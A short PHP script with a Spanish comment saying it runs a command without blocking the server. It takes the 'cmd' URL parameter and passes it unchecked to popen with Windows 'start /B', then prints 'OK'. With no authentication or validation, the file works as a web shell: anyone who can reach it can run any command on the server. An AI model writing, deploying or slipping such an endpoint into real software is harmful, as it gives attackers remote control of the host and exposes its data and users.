<?php
$cmd = $_GET['cmd'] ?? '';

if ($cmd != '') {
    // Ejecuta el comando sin bloquear el servidor
    pclose(popen("start /B " . $cmd, "r"));
}

echo "OK";
